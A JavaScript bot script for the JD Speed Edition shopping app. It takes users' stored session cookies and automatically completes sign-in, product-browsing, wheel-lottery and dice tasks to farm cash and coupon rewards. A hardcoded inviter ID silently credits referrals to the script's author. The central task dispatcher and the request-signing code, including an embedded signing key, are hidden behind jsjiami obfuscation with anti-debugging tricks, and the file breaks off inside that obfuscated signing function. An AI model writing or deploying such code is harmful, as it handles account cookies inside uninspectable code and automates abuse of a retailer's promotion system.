/*
京东极速版签到+赚现金任务
每日9毛左右，满3，10，50可兑换无门槛红包
⚠️⚠️⚠️一个号需要运行40分钟左右

活动时间：长期
活动入口：京东极速版app-现金签到
原脚本作者：lxk0301
*/
const $ = new Env('京东极速版');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/', actCode = 'visa-card-001';


!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${ $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${ $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdGlobal()
      await $.wait(2*1000)
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

var _0xodd='jsjiami.com.v6',_0x1fc2=[_0xodd,'C8KIw7fChsKb','wql9wo9oDA==','UcOhQgwd','M8KzwrjDncK1','YUTDok1D','w4rCmyF/w50=','esOuwqbDosOW','wrXClMKOYEU=','XMKXVBgmPQ==','YsOnWQBxIsOqw59owqM6bhbChzh6YU/ChFcgw58wwqbCs8Ktw5Y2wp/DhcOI','R8OcVxEv','w4fCqXMjUw==','w7XCtsOaJiQ=','w4PDlwtXLQ==','J8K5UVhh','Z8OnYiTCvQ==','X8OEwrXDr8OU','w7tiGFnCgg==','NhufjCVsjiaQyImi.OBZcom.v6=='];(function(_0x3e77da,_0x224067,_0x3f96c3){var _0x25bff7=function(_0x1642c0,_0x31c3e7,_0x305d62,_0x382dc0,_0x12019a){_0x31c3e7=_0x31c3e7>>0x8,_0x12019a='po';var _0x20bdb2='shift',_0x591758='push';if(_0x31c3e7<_0x1642c0){while(--_0x1642c0){_0x382dc0=_0x3e77da[_0x20bdb2]();if(_0x31c3e7===_0x1642c0){_0x31c3e7=_0x382dc0;_0x305d62=_0x3e77da[_0x12019a+'p']()}else if(_0x31c3e7&&_0x305d62['replace'](/[NhufCVQyIOBZ=]/g,'')===_0x31c3e7){_0x3e77da[_0x591758](_0x382dc0)}}_0x3e77da[_0x591758](_0x3e77da[_0x20bdb2]())}return 0x779b2};var _0x524bdc=function(){var _0x3c3fe6={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0xe4e5c0,_0x42b1c5,_0x1d14c8,_0x1ddf6f){_0x1ddf6f=_0x1ddf6f||{};var _0x593195=_0x42b1c5+'='+_0x1d14c8;var _0x5a7a63=0x0;for(var _0x5a7a63=0x0,_0x248d08=_0xe4e5c0['length'];_0x5a7a63<_0x248d08;_0x5a7a63++){var _0x1adad1=_0xe4e5c0[_0x5a7a63];_0x593195+=';\x20'+_0x1adad1;var _0x45d99a=_0xe4e5c0[_0x1adad1];_0xe4e5c0['push'](_0x45d99a);_0x248d08=_0xe4e5c0['length'];if(_0x45d99a!==!![]){_0x593195+='='+_0x45d99a}}_0x1ddf6f['cookie']=_0x593195},'removeCookie':function(){return'dev'},'getCookie':function(_0x1da69a,_0x4406f3){_0x1da69a=_0x1da69a||function(_0x2d2c27){return _0x2d2c27};var _0x24f8c5=_0x1da69a(new RegExp('(?:^|;\x20)'+_0x4406f3['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3067f2=function(_0x59c465,_0x5c4a97,_0x489522){_0x59c465(++_0x5c4a97,_0x489522)};_0x3067f2(_0x25bff7,_0x224067,_0x3f96c3);return _0x24f8c5?decodeURIComponent(_0x24f8c5[0x1]):undefined}};var _0x2ab66b=function(){var _0x3a8556=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3a8556['test'](_0x3c3fe6['removeCookie']['toString']())};_0x3c3fe6['updateCookie']=_0x2ab66b;var _0x5eb038='';var _0x573bfe=_0x3c3fe6['updateCookie']();if(!_0x573bfe){_0x3c3fe6['setCookie'](['*'],'counter',0x1)}else if(_0x573bfe){_0x5eb038=_0x3c3fe6['getCookie'](null,'counter')}else{_0x3c3fe6['removeCookie']()}};_0x524bdc()}(_0x1fc2,0x14d,0x14d00));var _0x467c=function(_0xbf30cc,_0x19b78f){_0xbf30cc=~~'0x'['concat'](_0xbf30cc);var _0x5edb3a=_0x1fc2[_0xbf30cc];if(_0x467c['RTWqzK']===undefined){(function(){var _0xebc0dc;try{var _0x13fece=Function('return\x20(function()\x20{}.constructor(\x22return\x20this\x22)(\x20));');_0xebc0dc=_0x13fece()}catch(_0x9d5aed){_0xebc0dc=window}var _0x3139ef='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xebc0dc['atob']||(_0xebc0dc['atob']=function(_0x31a3e9){var _0x3f0bce=String(_0x31a3e9)['replace'](/=+$/,'');for(var _0xa6f8a1=0x0,_0xc5406a,_0x34fa5d,_0x496c06=0x0,_0x157bd2='';_0x34fa5d=_0x3f0bce['charAt'](_0x496c06++);~_0x34fa5d&&(_0xc5406a=_0xa6f8a1%0x4?_0xc5406a*0x40+_0x34fa5d:_0x34fa5d,_0xa6f8a1++%0x4)?_0x157bd2+=String['fromCharCode'](0xff&_0xc5406a>>(-0x2*_0xa6f8a1&0x6)):0x0){_0x34fa5d=_0x3139ef['indexOf'](_0x34fa5d)}return _0x157bd2})}());var _0x141849=function(_0x516d0a,_0x19b78f){var _0x5468d8=[],_0x76abcc=0x0,_0xaa3872,_0x3327a1='',_0x26b66c='';_0x516d0a=atob(_0x516d0a);for(var _0x115bf1=0x0,_0x40afb8=_0x516d0a['length'];_0x115bf1<_0x40afb8;_0x115bf1++){_0x26b66c+='%'+('00'+_0x516d0a['charCodeAt'](_0x115bf1)['toString'](0x10))['slice'](-0x2)}_0x516d0a=decodeURIComponent(_0x26b66c);for(var _0x421570=0x0;_0x421570<0x100;_0x421570++){_0x5468d8[_0x421570]=_0x421570}for(_0x421570=0x0;_0x421570<0x100;_0x421570++){_0x76abcc=(_0x76abcc+_0x5468d8[_0x421570]+_0x19b78f['charCodeAt'](_0x421570%_0x19b78f['length']))%0x100;_0xaa3872=_0x5468d8[_0x421570];_0x5468d8[_0x421570]=_0x5468d8[_0x76abcc];_0x5468d8[_0x76abcc]=_0xaa3872}_0x421570=0x0;_0x76abcc=0x0;for(var _0x74cb17=0x0;_0x74cb17<_0x516d0a['length'];_0x74cb17++){_0x421570=(_0x421570+0x1)%0x100;_0x76abcc=(_0x76abcc+_0x5468d8[_0x421570])%0x100;_0xaa3872=_0x5468d8[_0x421570];_0x5468d8[_0x421570]=_0x5468d8[_0x76abcc];_0x5468d8[_0x76abcc]=_0xaa3872;_0x3327a1+=String['fromCharCode'](_0x516d0a['charCodeAt'](_0x74cb17)^_0x5468d8[(_0x5468d8[_0x421570]+_0x5468d8[_0x76abcc])%0x100])}return _0x3327a1};_0x467c['yQxhZx']=_0x141849;_0x467c['fzgPHJ']={};_0x467c['RTWqzK']=!![]}var _0x1ce4b0=_0x467c['fzgPHJ'][_0xbf30cc];if(_0x1ce4b0===undefined){if(_0x467c['xPnElz']===undefined){var _0x227ecf=function(_0x2a02d6){this['WXgMWC']=_0x2a02d6;this['AHNXdM']=[0x1,0x0,0x0];this['ySQysW']=function(){return'newState'};this['XuMDFC']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['sBidEY']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x227ecf['prototype']['yAGryi']=function(){var _0x55533e=new RegExp(this['XuMDFC']+this['sBidEY']);var _0x596578=_0x55533e['test'](this['ySQysW']['toString']())?--this['AHNXdM'][0x1]:--this['AHNXdM'][0x0];return this['DhATFb'](_0x596578)};_0x227ecf['prototype']['DhATFb']=function(_0x1f261c){if(!Boolean(~_0x1f261c)){return _0x1f261c}return this['brUgDS'](this['WXgMWC'])};_0x227ecf['prototype']['brUgDS']=function(_0x592505){for(var _0x60f98=0x0,_0x1e02ea=this['AHNXdM']['length'];_0x60f98<_0x1e02ea;_0x60f98++){this['AHNXdM']['push'](Math['round'](Math['random']()));_0x1e02ea=this['AHNXdM']['length']}return _0x592505(this['AHNXdM'][0x0])};new _0x227ecf(_0x467c)['yAGryi']();_0x467c['xPnElz']=!![]}_0x5edb3a=_0x467c['yQxhZx'](_0x5edb3a,_0x19b78f);_0x467c['fzgPHJ'][_0xbf30cc]=_0x5edb3a}else{_0x5edb3a=_0x1ce4b0}return _0x5edb3a};var _0xe739f1=function(){var _0x5f568d=!![];return function(_0x5b269e,_0xa7d403){var _0x3f4e6b=_0x5f568d?function(){if(_0xa7d403){var _0x193be3=_0xa7d403['apply'](_0x5b269e,arguments);_0xa7d403=null;return _0x193be3}}:function(){};_0x5f568d=![];return _0x3f4e6b}}();var _0x21d8d6=_0xe739f1(this,function(){var _0x5416cb=function(){return'\x64\x65\x76'},_0x12c682=function(){return'\x77\x69\x6e\x64\x6f\x77'};var _0x2d6717=function(){var _0x4ce516=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4ce516['\x74\x65\x73\x74'](_0x5416cb['\x74\x6f\x53\x74\x72\x69\x6e\x67']())};var _0x47061f=function(){var _0x411442=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x411442['\x74\x65\x73\x74'](_0x12c682['\x74\x6f\x53\x74\x72\x69\x6e\x67']())};var _0x469b70=function(_0x394752){var _0x72fcc7=~-0x1>>0x1+0xff%0x0;if(_0x394752['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x72fcc7)){_0x5cbe39(_0x394752)}};var _0x5cbe39=function(_0x1328e9){var _0x437db7=~-0x4>>0x1+0xff%0x0;if(_0x1328e9['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x437db7){_0x469b70(_0x1328e9)}};if(!_0x2d6717()){if(!_0x47061f()){_0x469b70('\x69\x6e\x64\u0435\x78\x4f\x66')}else{_0x469b70('\x69\x6e\x64\x65\x78\x4f\x66')}}else{_0x469b70('\x69\x6e\x64\u0435\x78\x4f\x66')}});_0x21d8d6();async function jdGlobal(){var _0x2de68d={'FdPQt':_0x467c('0','FxyU'),'HcHnK':function(_0xf6d79e){return _0xf6d79e()},'kevfN':function(_0x586573){return _0x586573()},'htgob':function(_0xf107a4){return _0xf107a4()},'PYELF':function(_0x22404f){return _0x22404f()},'pJlQs':function(_0x2259f5){return _0x2259f5()},'NOekL':function(_0x19aeef){return _0x19aeef()},'qFejK':function(_0x31a932){return _0x31a932()}};try{var _0x170bb8=_0x2de68d[_0x467c('1','anh*')][_0x467c('2','r^qN')]('|'),_0x2c171b=0x0;while(!![]){switch(_0x170bb8[_0x2c171b++]){case'0':await _0x2de68d[_0x467c('3','pJn^')](wheelsHome);continue;case'1':$[_0x467c('4',']2UM')]=0x0;continue;case'2':$[_0x467c('5','FxyU')]=0x0;continue;case'3':await _0x2de68d[_0x467c('6','MKKg')](showMsg);continue;case'4':await _0x2de68d[_0x467c('7','(9K5')](taskList);continue;case'5':await _0x2de68d[_0x467c('8','LQD^')](apTaskList);continue;case'6':await _0x2de68d[_0x467c('9','GVo4')](signInit);continue;case'7':await _0x2de68d[_0x467c('a','2v5b')](cash);continue;case'8':await _0x2de68d[_0x467c('b','anh*')](wheelsHome);continue;case'9':await _0x2de68d[_0x467c('c','u07z')](richManIndex);continue;case'10':await _0x2de68d[_0x467c('d','8oYO')](signInit);continue;case'11':await _0x2de68d[_0x467c('e','Hn]m')](invite);continue;case'12':await _0x2de68d[_0x467c('f','(9K5')](sign);continue;case'13':await _0x2de68d[_0x467c('10','08]j')](queryJoy);continue}break}}catch(_0x43a2ee){$[_0x467c('11','&6tR')](_0x43a2ee)}};_0xodd='jsjiami.com.v6';

function showMsg() {
  return new Promise(resolve => {
    message += `本次运行获得${$.score}金币，共计${$.total}金币`
    $.msg($.name, '', `京东账号${$.index}${$.UserName}\n${message}`);
    resolve()
  })
}

async function signInit() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSignInit', {
      "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
      "kernelPlatform": "RN",
      "inviterId":"DNfaRn46j3w7TR4On8bJjlhOf"
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            //console.log(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function sign() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSign', {
        "kernelPlatform": "RN",
        "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
        "noWaitPrize": "false"
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.subCode === 0) {
                console.log(`签到获得${data.data.signAmount}现金，共计获得${data.data.cashDrawAmount}`)
              } else {
                console.log(`签到失败，${data.msg}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function taskList() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
        "version": "3.1.0",
        "method": "newTaskCenterPage",
        "data": {"channel": 1}
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              for (let task of data.data) {
                $.taskName = task.taskInfo.mainTitle
                if (task.taskInfo.status === 0) {
                  if (task.taskType >= 1000) {
                    await doTask(task.taskType)
                    await $.wait(1000)
                  } else {
                    $.canStartNewItem = true
                    while ($.canStartNewItem) {
                      if (task.taskType !== 3) {
                        await queryItem(task.taskType)
                      } else {
                        await startItem("", task.taskType)
                      }
                    }
                  }
                } else {
                  console.log(`${task.taskInfo.mainTitle}已完成`)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function doTask(taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "marketTaskRewardPayment",
      "data": {"channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              console.log(`${data.data.taskInfo.mainTitle}任务完成成功，预计获得${data.data.reward}金币`)
            } else {
              console.log(`任务完成失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function queryJoy() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {"method": "queryJoyPage", "data": {"channel": 1}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.data.taskBubbles)
                for (let task of data.data.taskBubbles) {
                  await rewardTask(task.id, task.activeType)
                  await $.wait(500)
                }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function rewardTask(id, taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "joyTaskReward",
      "data": {"id": id, "channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              $.score += data.data.reward
              console.log(`气泡收取成功，获得${data.data.reward}金币`)
            } else {
              console.log(`气泡收取失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}


async function queryItem(activeType = 1) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "queryNextTask",
      "data": {"channel": 1, "activeType": activeType}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              await startItem(data.data.nextResource, activeType)
            } else {
              console.log(`商品任务开启失败，${data.message}`)
              $.canStartNewItem = false
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function startItem(activeId, activeType) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "enterAndLeave",
      "data": {
        "activeId": activeId,
        "clientTime": +new Date(),
        "channel": "1",
        "messageType": "1",
        "activeType": activeType,
      }
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              if (data.data.taskInfo.isTaskLimit === 0) {
                let {videoBrowsing, taskCompletionProgress, taskCompletionLimit} = data.data.taskInfo
                if (activeType !== 3)
                  videoBrowsing = activeType === 1 ? 5 : 10
                console.log(`【${taskCompletionProgress + 1}/${taskCompletionLimit}】浏览商品任务记录成功，等待${videoBrowsing}秒`)
                await $.wait(videoBrowsing * 1000)
                await endItem(data.data.uuid, activeType, activeId, activeType === 3 ? videoBrowsing : "")
              } else {
                console.log(`${$.taskName}任务已达上限`)
                $.canStartNewItem = false
              }
            } else {
              $.canStartNewItem = false
              console.log(`${$.taskName}任务开启失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function endItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "enterAndLeave",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              await rewardItem(uuid, activeType, activeId, videoTimeLength)
            } else {
              console.log(`${$.taskName}任务结束失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function rewardItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "rewardPayment",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              $.score += data.data.reward
              console.log(`${$.taskName}任务完成，获得${data.data.reward}金币`)
            } else {
              console.log(`${$.taskName}任务失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function cash() {
  return new Promise(resolve => {
    $.get(taskUrl('MyAssetsService.execute',
      {"method": "userCashRecord", "data": {"channel": 1, "pageNum": 1, "pageSize": 20}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              $.total = data.data.goldBalance
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

// 大转盘
function wheelsHome() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsHome',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                console.log(`【幸运大转盘】剩余抽奖机会：${data.data.lotteryChances}`)
                while(data.data.lotteryChances--) {
                  await wheelsLottery()
                  await $.wait(500)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘
function wheelsLottery() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsLottery',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.data && data.data.rewardType){
                console.log(`幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`)
                message += `幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`
              }else{
                console.log(`幸运大转盘抽奖获得：空气`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘任务
function apTaskList() {
  return new Promise(resolve => {
    $.get(taskGetUrl('apTaskList',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                for(let task of data.data){
                  // {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":"SIGN","taskId":67,"channel":4}
                  if(!task.taskFinished && ['SIGN','BROWSE_CHANNEL'].includes(task.taskType)){
                    console.log(`去做任务${task.taskTitle}`)
                    await apDoTask(task.taskType,task.id,4,task.taskSourceUrl)
                  }
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘做任务
function apDoTask(taskType,taskId,channel,itemId) {
  // console.log({"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId})
  return new Promise(resolve => {
    $.get(taskGetUrl('apDoTask',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0 && data.data && data.data.finished){
                console.log(`任务完成成功`)
              }else{
                console.log(JSON.stringify(data))
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 红包大富翁
function richManIndex() {
  return new Promise(resolve => {
    $.get(taskUrl('richManIndex', {"actId":"hbdfw","needGoldToast":"true"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.userInfo){
              console.log(`用户当前位置：${data.data.userInfo.position}，剩余机会：${data.data.userInfo.randomTimes}`)
              while(data.data.userInfo.randomTimes--){
                await shootRichManDice()
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
// 红包大富翁
function shootRichManDice() {
  return new Promise(resolve => {
    $.get(taskUrl('shootRichManDice', {"actId":"hbdfw"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.rewardType && data.data.couponDesc){
              message += `红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】\n`
              console.log(`红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】`)
            }else{
              console.log(`红包大富翁抽奖：获得空气`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb24bc=["\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x26\x61\x6E\x64\x72\x6F\x69\x64\x26\x33\x2E\x31\x2E\x30\x26","\x26","\x26\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66","\x31\x32\x61\x65\x61\x36\x35\x38\x66\x37\x36\x65\x34\x35\x33\x66\x61\x66\x38\x30\x33\x64\x31\x35\x63\x34\x30\x61\x37\x32\x65\x30","\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","","\x61\x70\x69\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x62\x6F\x64\x79\x3D","\x26\x61\x70\x70\x69\x64\x3D\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26\x63\x6C\x69\x65\x6E\x74\x3D\x61\x6E\x64\x72\x6F\x69\x64\x26\x75\x75\x69\x64\x3D\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x33\x2E\x31\x2E\x30\x26\x74\x3D","\x26\x73\x69\x67\x6E\x3D","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x2A\x2F\x2A","\x52\x4E","\x4A\x44\x4D\x6F\x62\x69\x6C\x65\x4C\x69\x74\x65\x2F\x33\x2E\x31\x2E\x30\x20\x28\x69\x50\x61\x64\x3B\x20\x69\x4F\x53\x20\x31\x34\x2E\x34\x3B\x20\x53\x63\x61\x6C\x65\x2F\x32\x2E\x30\x30\x29","\x7A\x68\x2D\x48\x61\x6E\x73\x2D\x43\x4E\x3B\x71\x3D\x31\x2C\x20\x6A\x61\x2D\x43\x4E\x3B\x71\x3D\x30\x2E\x39","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taskUrl(_0x7683x2,_0x7683x3= {}){let _0x7683x4=+ new Date();let _0x7683x5=`${__Oxb24bc[0x0]}${JSON[__Oxb24bc[0x1]](_0x7683x3)}${__Oxb24bc[0x2]}${_0x7683x2}${__Oxb24bc[0x3]}${_0x7683x4}${__Oxb24bc[0x4]}`;let 